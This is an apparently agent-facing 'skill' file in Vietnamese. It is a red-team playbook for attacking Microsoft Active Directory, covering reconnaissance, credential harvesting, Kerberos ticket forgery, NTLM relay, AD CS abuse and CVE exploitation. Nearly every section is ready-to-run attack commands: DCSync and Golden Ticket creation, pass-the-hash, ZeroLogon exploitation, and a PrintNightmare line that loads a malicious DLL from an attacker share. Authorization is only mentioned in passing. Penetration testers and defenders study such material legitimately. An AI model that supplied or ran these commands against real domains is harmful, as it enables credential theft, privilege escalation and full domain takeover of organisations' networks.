---
name: Active Directory Attacks
description: Kỹ năng này nên được sử dụng khi người dùng yêu cầu "tấn công Active Directory", "khai thác AD", "Kerberoasting", "DCSync", "pass-the-hash", "liệt kê BloodHound", "Golden Ticket", "Silver Ticket", "AS-REP roasting", "NTLM relay", hoặc cần hướng dẫn về kiểm thử xâm nhập Windows domain.
metadata:
  author: zebbern
  version: "1.1"
---

# Tấn công Active Directory

## Mục đích

Cung cấp các kỹ thuật toàn diện để tấn công môi trường Microsoft Active Directory. Bao gồm trinh sát, thu thập thông tin xác thực, tấn công Kerberos, di chuyển ngang (lateral movement), leo thang đặc quyền và chiếm quyền kiểm soát domain cho các hoạt động red team và kiểm thử xâm nhập.

## Đầu vào/Điều kiện tiên quyết

- Kali Linux hoặc nền tảng tấn công Windows
- Thông tin xác thực người dùng domain (cho hầu hết các cuộc tấn công)
- Quyền truy cập mạng tới Domain Controller (DC)
- Công cụ: Impacket, Mimikatz, BloodHound, Rubeus, CrackMapExec

## Đầu ra/Sản phẩm bàn giao

- Dữ liệu liệt kê Domain
- Thông tin xác thực và mã băm (hash) đã trích xuất
- Vé Kerberos (Kerberos tickets) để mạo danh
- Quyền truy cập Quản trị viên Domain (Domain Administrator)
- Các cơ chế duy trì quyền truy cập (persistence)

---

## Các Công cụ Thiết yếu

| Công cụ      | Mục đích                            |
| ------------ | ----------------------------------- |
| BloodHound   | Trực quan hóa đường dẫn tấn công AD |
| Impacket     | Bộ công cụ tấn công AD bằng Python  |
| Mimikatz     | Trích xuất thông tin xác thực       |
| Rubeus       | Các cuộc tấn công Kerberos          |
| CrackMapExec | Khai thác mạng                      |
| PowerView    | Liệt kê AD (enumeration)            |
| Responder    | Đầu độc LLMNR/NBT-NS                |

---

## Quy trình Cốt lõi

### Bước 1: Đồng bộ hóa đồng hồ Kerberos

Kerberos yêu cầu đồng bộ hóa đồng hồ (sai số ±5 phút):

```bash
# Phát hiện độ lệch thời gian
nmap -sT 10.10.10.10 -p445 --script smb2-time

# Sửa thời gian trên Linux
sudo date -s "14 APR 2024 18:25:16"

# Sửa thời gian trên Windows
net time /domain /set

# Giả mạo thời gian mà không thay đổi hệ thống
faketime -f '+8h' <command>
```

### Bước 2: Trinh sát AD với BloodHound

```bash
# Khởi động BloodHound
neo4j console
bloodhound --no-sandbox

# Thu thập dữ liệu với SharpHound
.\SharpHound.exe -c All
.\SharpHound.exe -c All --ldapusername user --ldappassword pass

# Trình thu thập Python (từ Linux)
bloodhound-python -u 'user' -p 'password' -d domain.local -ns 10.10.10.10 -c all
```

### Bước 3: Liệt kê với PowerView

```powershell
# Lấy thông tin domain
Get-NetDomain
Get-DomainSID
Get-NetDomainController

# Liệt kê người dùng
Get-NetUser
Get-NetUser -SamAccountName targetuser
Get-UserProperty -Properties pwdlastset

# Liệt kê nhóm
Get-NetGroupMember -GroupName "Domain Admins"
Get-DomainGroup -Identity "Domain Admins" | Select-Object -ExpandProperty Member

# Tìm quyền quản trị cục bộ
Find-LocalAdminAccess -Verbose

# Săn người dùng (User hunting)
Invoke-UserHunter
Invoke-UserHunter -Stealth
```

---

## Tấn công Thông tin xác thực (Credential Attacks)

### Password Spraying (Thử mật khẩu hàng loạt)

```bash
# Sử dụng kerbrute
./kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt Password123

# Sử dụng CrackMapExec
crackmapexec smb 10.10.10.10 -u users.txt -p 'Password123' --continue-on-success
```

### Kerberoasting

Trích xuất vé TGS của tài khoản dịch vụ và bẻ khóa ngoại tuyến:

```bash
# Impacket
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request -outputfile hashes.txt

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.txt

# CrackMapExec
crackmapexec ldap 10.10.10.10 -u user -p password --kerberoast output.txt

# Bẻ khóa với hashcat
hashcat -m 13100 hashes.txt rockyou.txt
```

### AS-REP Roasting

Nhắm mục tiêu vào các tài khoản có thiết lập "Do not require Kerberos preauthentication":

```bash
# Impacket
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat

# Rubeus
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt

# Bẻ khóa với hashcat
hashcat -m 18200 hashes.txt rockyou.txt
```

### Tấn công DCSync

Trích xuất thông tin xác thực trực tiếp từ DC (Yêu cầu quyền Replicating Directory Changes):

```bash
# Impacket
secretsdump.py domain.local/admin:password@10.10.10.10 -just-dc-user krbtgt

# Mimikatz
lsadump::dcsync /domain:domain.local /user:krbtgt
lsadump::dcsync /domain:domain.local /user:Administrator
```

---

## Tấn công Vé Kerberos (Kerberos Ticket Attacks)

### Pass-the-Ticket (Golden Ticket)

Giả mạo TGT với mã băm krbtgt cho bất kỳ người dùng nào:

```powershell
# Lấy mã băm krbtgt qua DCSync trước
# Mimikatz - Tạo Golden Ticket
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:HASH /id:500 /ptt

# Impacket
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-xxx -domain domain.local Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass domain.local/Administrator@dc.domain.local
```

### Silver Ticket

Giả mạo TGS cho một dịch vụ cụ thể:

```powershell
# Mimikatz
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:cifs /rc4:SERVICE_HASH /ptt
```

### Pass-the-Hash

```bash
# Impacket
psexec.py domain.local/Administrator@10.10.10.10 -hashes :NTHASH
wmiexec.py domain.local/Administrator@10.10.10.10 -hashes :NTHASH
smbexec.py domain.local/Administrator@10.10.10.10 -hashes :NTHASH

# CrackMapExec
crackmapexec smb 10.10.10.10 -u Administrator -H NTHASH -d domain.local
crackmapexec smb 10.10.10.10 -u Administrator -H NTHASH --local-auth
```

### OverPass-the-Hash

Chuyển đổi mã băm NTLM thành vé Kerberos:

```bash
# Impacket
getTGT.py domain.local/user -hashes :NTHASH
export KRB5CCNAME=user.ccache

# Rubeus
.\Rubeus.exe asktgt /user:user /rc4:NTHASH /ptt
```

---

## Tấn công NTLM Relay

### Responder + ntlmrelayx

```bash
# Khởi động Responder (tắt SMB/HTTP để relay)
responder -I eth0 -wrf

# Khởi động relay
ntlmrelayx.py -tf targets.txt -smb2support

# LDAP relay cho tấn công ủy quyền (delegation)
ntlmrelayx.py -t ldaps://dc.domain.local -wh attacker-wpad --delegate-access
```

### Kiểm tra Ký SMB (SMB Signing Check)

```bash
crackmapexec smb 10.10.10.0/24 --gen-relay-list targets.txt
```

---

## Tấn công Dịch vụ Chứng chỉ (AD CS Attacks)

### ESC1 - Mẫu thiết lập sai (Misconfigured Templates)

```bash
# Tìm các mẫu có lỗ hổng
certipy find -u user@domain.local -p password -dc-ip 10.10.10.10

# Khai thác ESC1
certipy req -u user@domain.local -p password -ca CA-NAME -target dc.domain.local -template VulnTemplate -upn administrator@domain.local

# Xác thực bằng chứng chỉ
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

### ESC8 - Relay Đăng ký Web (Web Enrollment Relay)

```bash
ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

---

## Các lỗ hổng bảo mật (CVE) nghiêm trọng

### ZeroLogon (CVE-2020-1472)

```bash
# Kiểm tra lỗ hổng
crackmapexec smb 10.10.10.10 -u '' -p '' -M zerologon

# Khai thác
python3 cve-2020-1472-exploit.py DC01 10.10.10.10

# Trích xuất mã băm
secretsdump.py -just-dc domain.local/DC01\$@10.10.10.10 -no-pass

# Khôi phục mật khẩu (quan trọng!)
python3 restorepassword.py domain.local/DC01@DC01 -target-ip 10.10.10.10 -hexpass HEXPASSWORD
```

### PrintNightmare (CVE-2021-1675)

```bash
# Kiểm tra lỗ hổng
rpcdump.py @10.10.10.10 | grep 'MS-RPRN'

# Khai thác (yêu cầu lưu trữ DLL độc hại)
python3 CVE-2021-1675.py domain.local/user:pass@10.10.10.10 '\\attacker\share\evil.dll'
```

### samAccountName Spoofing (CVE-2021-42278/42287)

```bash
# Khai thác tự động
python3 sam_the_admin.py "domain.local/user:password" -dc-ip 10.10.10.10 -shell
```

---

## Tài liệu Tham khảo nhanh

| Cuộc tấn công        | Công cụ     | Lệnh                                              |
| -------------------- | ----------- | ------------------------------------------------- |
| Kerberoast           | Impacket    | `GetUserSPNs.py domain/user:pass -request`        |
| AS-REP Roast         | Impacket    | `GetNPUsers.py domain/ -usersfile users.txt`      |
| DCSync               | secretsdump | `secretsdump.py domain/admin:pass@DC`             |
| Pass-the-Hash        | psexec      | `psexec.py domain/user@target -hashes :HASH`      |
| Golden Ticket        | Mimikatz    | `kerberos::golden /user:Admin /krbtgt:HASH`       |
| Spray (Thử mật khẩu) | kerbrute    | `kerbrute passwordspray -d domain users.txt Pass` |

---

## Các Ràng buộc

**Phải:**

- Đồng bộ hóa thời gian với DC trước khi tấn công Kerberos
- Có thông tin xác thực domain hợp lệ cho hầu hết các cuộc tấn công
- Ghi lại tất cả các tài khoản đã bị xâm nhập

**Không được:**

- Khóa tài khoản bằng cách thử mật khẩu hàng loạt quá mức
- Sửa đổi các đối tượng AD thực tế mà không có sự cho phép
- Để lại Golden Tickets mà không có tài liệu ghi chép

**Nên:**

- Chạy BloodHound để khám phá đường dẫn tấn công
- Kiểm tra ký SMB trước khi thực hiện tấn công relay
- Xác minh cấp độ bản vá trước khi khai thác CVE

---

## Ví dụ

### Ví dụ 1: Chiếm quyền kiểm soát Domain qua Kerberoasting

```bash
# 1. Tìm các tài khoản dịch vụ có SPN
GetUserSPNs.py domain.local/lowpriv:password -dc-ip 10.10.10.10

# 2. Yêu cầu vé TGS
GetUserSPNs.py domain.local/lowpriv:password -dc-ip 10.10.10.10 -request -outputfile tgs.txt

# 3. Bẻ khóa vé
hashcat -m 13100 tgs.txt rockyou.txt

# 4. Sử dụng tài khoản dịch vụ đã bẻ khóa được
psexec.py domain.local/svc_admin:CrackedPassword@10.10.10.10
```

### Ví dụ 2: NTLM Relay tới LDAP

```bash
# 1. Bắt đầu relay nhắm vào LDAP
ntlmrelayx.py -t ldaps://dc.domain.local --delegate-access

# 2. Kích hoạt xác thực (ví dụ: qua PrinterBug)
python3 printerbug.py domain.local/user:pass@target 10.10.10.12

# 3. Sử dụng tài khoản máy đã tạo cho cuộc tấn công RBCD
```

---

## Xử lý sự cố

| Vấn đề                             | Giải pháp                                                   |
| ---------------------------------- | ----------------------------------------------------------- |
| Lệch đồng hồ quá lớn               | Đồng bộ thời gian với DC hoặc sử dụng faketime              |
| Kerberoasting không trả về kết quả | Không có tài khoản dịch vụ nào có SPN                       |
| DCSync bị từ chối truy cập         | Cần quyền Replicating Directory Changes                     |
| NTLM relay thất bại                | Kiểm tra ký SMB, thử mục tiêu LDAP                          |
| BloodHound không có dữ liệu        | Xác minh trình thu thập đã chạy với thông tin xác thực đúng |

---

## Tài nguyên Bổ sung

Để biết các kỹ thuật nâng cao bao gồm tấn công ủy quyền, lạm dụng GPO, tấn công RODC, triển khai SCCM/WSUS, khai thác ADCS, quan hệ tin cậy và tích hợp Linux AD, hãy xem [references/advanced-attacks_vi.md](references/advanced-attacks_vi.md).
